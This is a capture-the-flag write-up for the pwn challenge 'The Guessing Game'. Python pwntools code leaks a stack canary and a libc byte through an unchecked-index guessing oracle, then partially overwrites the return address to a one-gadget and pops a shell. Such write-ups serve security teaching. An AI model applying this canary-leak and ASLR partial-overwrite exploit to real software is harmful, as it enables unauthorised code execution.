# The Guessing Game
## Pwn

# Solution
Upon starting, the program initialises 8 bytes with random numbers from `rand()`. We are then asked to provide an index (0-7) and a guess (0-255) for the number at that index. Once we have 8 correct guesses, the loop ends and we are asked to provide feedback.

## Bug
The index of our guess isn't checked, meaning that we can get a form of OOB read. By doing a binary search between 0 and 255, we can guess at the value of the byte until it is correct, effectively leaking a value. The 'feedback' input has a standard buffer overflow bug.
The challenge is made more complex by the introduction of a stack canary.

We can first write a short routine in order to find the value of a byte.

```python3
e = ELF("./guess")
r = process(e.path)

def check_value(index, value):
    r.recvuntil(b"? ", timeout=1)
    r.sendline(str(index).encode())
    r.recvuntil(b"guess: ", timeout=1)
    r.sendline(str(value).encode())
    res = r.recvline().decode()
    if "too low" in res:
        return -1
    elif "high" in res:
        return 1
    else:
        return True


def find_value(index):
    possible = list(range(255))
    while True:
        pos = len(possible)//2
        test = check_value(index, possible[pos])
        if test is True:
            return possible[pos]
        elif test == -1:
            possible = possible[pos:]
        elif test == 1:
            possible = possible[:pos]

```

Our first job is to discover the canary. We can use the fact that the canary always begins with a null byte to our advantage -

```python3
    canary = b"\x00"
    while len(canary) < 8:
        canary = canary + chr(find_value(0x20 + len(canary))).encode('latin1')
```

This uses up 7 of our 8 reads, leaving us with only 1 byte of OOB read to leak the libc base, and overwrite a return address with a one-gadget ('target'). However, with careful arrangement, this is all we need.
1. The most significant 5 bytes of the libc address and 'target' will be the same
2. The 3rd least significant byte will have a constant offset from the target - as long as ASLR do not align the addresses such that the difference 'overflows' into the 4th LSB
3. The second least significant byte will its *lower* nibble unaffecte by ASLR
4. The least significant byte is completely unaffected by ASLR
Due to this, we can perform a 3 byte overwrite of the address, and gain code execution with a 4-bit brute - a 1/16 chance of success, which is reasonably high.

First, we will leak the 3rd LSB of the return address - this is the address of `ret` in `__libc_start_main`, known as `__libc_start_main_ret`

```python3
    libc_byte = find_value(0x20 + 8 + 8 + 2)

    offset = target - (l.sym['__libc_start_main'] + lsmr)
    byte_offset = (offset >> 16) & 0xff
    if (libc_byte + byte_offset) > 0xff:
        with context.local(log_level = 'error'):
            r.close()
        del r
        exit()
```
`lsmr` is the offset of 'ret' within `__libc_start_main` - 234 on the remote instance.
We can then construct our overwrite.
```python3
buffer = b"A" * 0x18 # Padding to reach end of buffer
buffer += canary     # Stack canary
buffer += b"B" * 8   # Saved RBP
buffer += chr(target & 0xff).encode('latin1')                   # LSB - known
buffer += chr(((target >> 8) & 0xff) | 0x80).encode('latin1')   # 2nd LSB - low nibble known, guess upper half
buffer += chr(libc_byte + byte_offset).encode('latin1')         # 3rd LSB - offset from leaked byte known
r.send(buffer)
r.recv()
```
The 0x80 here represents our guess - any value should result in comparable success rates.
Using `0xe6c7e` as `target`, a one-gadget on the remote libc, after a short number of tries we will pop a shell and get the flag:
`rarctf{4nd_th3y_s41d_gu3ss1ng_1snt_fun!!_c9cbd665}`
